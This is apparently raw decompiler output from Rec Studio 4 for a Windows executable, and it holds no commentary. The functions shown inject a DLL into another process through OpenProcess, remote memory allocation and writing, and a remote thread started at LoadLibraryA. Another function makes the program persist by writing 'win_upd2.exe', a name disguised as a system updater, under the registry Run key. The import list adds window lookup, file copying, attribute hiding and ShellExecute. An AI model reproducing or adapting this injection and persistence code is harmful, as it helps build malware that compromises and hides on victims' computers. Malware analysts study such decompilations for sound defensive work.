// Generated by Rec Studio 4 - build Sep 23 2015

L00401000(
    intOrPtr __eax,                        // r0
    signed int __ecx,                      // r2
    char* _a4,                             // _cfa_4
    intOrPtr* _a8                          // _cfa_8
)
{
    _unknown_ __ebx;                       // r1
    char* __edi;                           // r4
    intOrPtr* __esi;                       // r5
    intOrPtr _t3;                          // _t3

    __ecx = __ecx;
    _t3 = __eax;
    __edi = _a4;
    __esi = _a8;
    _push(__edi);
    LoadLibraryA();
    if(__eax != 0) {
        asm("xchg ebx, eax");
        while(1) {
            asm("cld");
            _t3 = 0;
            __ecx = __ecx | -1;
            asm("repne scasb");
            if( *__edi == 0) {
                break;
            }
            _push(__edi);
            _push(__ebx);
            GetProcAddress();
             *__esi = 0;
            if(0 != 0) {
                asm("lodsd");
                continue;
            }
            goto L6;
        }
        return 1;
    }
L6:
    return _t3;
}

L00401041(
    intOrPtr __eax,                        // r0
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a8,                          // _cfa_8
    intOrPtr _a12                          // _cfa_c
)
{
    intOrPtr _v8;                          // _cfa_fffffff8
    char _v12;                             // _cfa_fffffff4
    _unknown_ _t9;                         // _t9

    _push(0);
    _push(0);
    _push(2);
    _push(0);
    _push(3);
    _push(1073741824);
    _push(_a4);
    CreateFileA();
    _v8 = __eax;
    _t9 = __eax + 1;
    if(_t9 != 0) {
        _push(0);
        _push( &_v12);
        _push(_a12);
        _push(_a8);
        _push(_v8);
        WriteFile();
        _push(_v8);
        CloseHandle();
        return 1;
    } else {
        return _t9;
    }
}

L0040108D(
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a8                           // _cfa_8
)
{
    intOrPtr _v8;                          // _cfa_fffffff8
    intOrPtr _v12;                         // _cfa_fffffff4
    intOrPtr _v16;                         // _cfa_fffffff0
    char _v20;                             // _cfa_ffffffec
    intOrPtr _v24;                         // _cfa_ffffffe8
    char _v28;                             // _cfa_ffffffe4
    intOrPtr __ebx;                        // r1
    intOrPtr _t24;                         // _t24
    intOrPtr _t26;                         // _t26
    intOrPtr _t28;                         // _t28
    intOrPtr _t29;                         // _t29

    _t26 = L00401000(_t24, __ecx, "kernel32.dll", 4218568);
    if(_t26 == 0) {
        _push(4218588);
        LoadLibraryA();
        if(_t26 == 0) {
            return;
        }
L10:
        _push(10000);
        Sleep();
        goto L10;
    }
    _push(_a4);
    _push(0);
    _push(1082);
    OpenProcess();
    _v8 = _t26;
    if(_t26 != 0) {
        _push(_a8);
        lstrlenA();
        _v16 = _t26;
        _push(4);
        _push(4096);
        _push(_v16);
        _push(0);
        _push(_v8);
         *4218568();
        _v12 = _t26;
        __ebx = 0;
        _t28 = _t26;
        if(_t28 != 0) {
            _push(0);
            _push(_v16);
            _push(_a8);
            _push(_v12);
            _push(_v8);
             *4218580();
            _t29 = _t28;
            if(_t29 != 0) {
                _push("kernel32.dll");
                GetModuleHandleA();
                _push("LoadLibraryA");
                _push(_t29);
                GetProcAddress();
                _push( &_v20);
                _push(0);
                _push(_v12);
                _push(_t29);
                _push(0);
                _push(0);
                _push(_v8);
                 *4218576();
                _v24 = _t29;
                if(_t29 != 0) {
                    _push(-1);
                    _push(_v24);
                    WaitForSingleObject();
                    _push( &_v28);
                    _push(_v24);
                    GetExitCodeThread();
                    __ebx = _v28;
                    _push(_v24);
                    CloseHandle();
                }
            }
            _push(32768);
            _push(0);
            _push(_v12);
            _push(_v8);
             *4218572();
        }
        _push(_v8);
        CloseHandle();
        _t26 = __ebx;
    }
}

L00401198(
    intOrPtr _a4                           // _cfa_4
)
{
    char _v8;                              // _cfa_fffffff8
    _unknown_ _t6;                         // _t6

    _push( &_v8);
    _push("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
    _push(_a4);
    RegCreateKeyA();
    _push(4218849);
    lstrlenA();
    _t6 =  &_v8 + 1;
    _push(_t6);
    _push(4218849);
    _push(1);
    _push(0);
    _push("win_upd2.exe");
    _push(_v8);
    RegSetValueExA();
    _push(_v8);
    RegCloseKey();
    return _t6;
}

CloseHandle()
{// addr = 0x004012F8
    goto __imp__CloseHandle;
}

CopyFileA()
{// addr = 0x004012FE
    goto __imp__CopyFileA;
}

CreateFileA()
{// addr = 0x00401304
    goto __imp__CreateFileA;
}

ExitProcess()
{// addr = 0x0040130A
    goto __imp__ExitProcess;
}

GetExitCodeThread()
{// addr = 0x00401310
    goto __imp__GetExitCodeThread;
}

GetModuleFileNameA()
{// addr = 0x00401316
    goto __imp__GetModuleFileNameA;
}

GetModuleHandleA()
{// addr = 0x0040131C
    goto __imp__GetModuleHandleA;
}

GetProcAddress()
{// addr = 0x00401322
    goto __imp__GetProcAddress;
}

GetSystemDirectoryA()
{// addr = 0x00401328
    goto __imp__GetSystemDirectoryA;
}

LoadLibraryA()
{// addr = 0x0040132E
    goto __imp__LoadLibraryA;
}

OpenProcess()
{// addr = 0x00401334
    goto __imp__OpenProcess;
}

SetFileAttributesA()
{// addr = 0x0040133A
    goto __imp__SetFileAttributesA;
}

Sleep()
{// addr = 0x00401340
    goto __imp__Sleep;
}

WaitForSingleObject()
{// addr = 0x00401346
    goto __imp__WaitForSingleObject;
}

WriteFile()
{// addr = 0x0040134C
    goto __imp__WriteFile;
}

lstrcatA()
{// addr = 0x00401352
    goto __imp__lstrcatA;
}

lstrcmpiA()
{// addr = 0x00401358
    goto __imp__lstrcmpiA;
}

lstrlenA()
{// addr = 0x0040135E
    goto __imp__lstrlenA;
}

FindWindowA()
{// addr = 0x00401364
    goto __imp__FindWindowA;
}

GetWindowThreadProcessId()
{// addr = 0x0040136A
    goto __imp__GetWindowThreadProcessId;
}

ShellExecuteA()
{// addr = 0x00401370
    goto __imp__ShellExecuteA;
}

RegCloseKey()
{// addr = 0x00401376
    goto __imp__RegCloseKey;
}

RegCreateKeyA()
{// addr = 0x0040137C
    goto __imp__RegCreateKeyA;
}

RegSetValueExA()
{// addr = 0x00401382
    goto __imp__RegSetValueExA;
}

RegSetValueExA()
{// addr = 0x00401382
    goto __imp__RegSetValueExA;
}

// Statistics:
//      19 Register nodes
//      28 Temporaries nodes
//       0 Casts
//      69 Statements
//       4 Labels
//       2 Gotos
//      28 Blocks
//     363 Nodes
//       4 Assembly nodes
//       3 Unknown Types


Total time: 0 seconds.
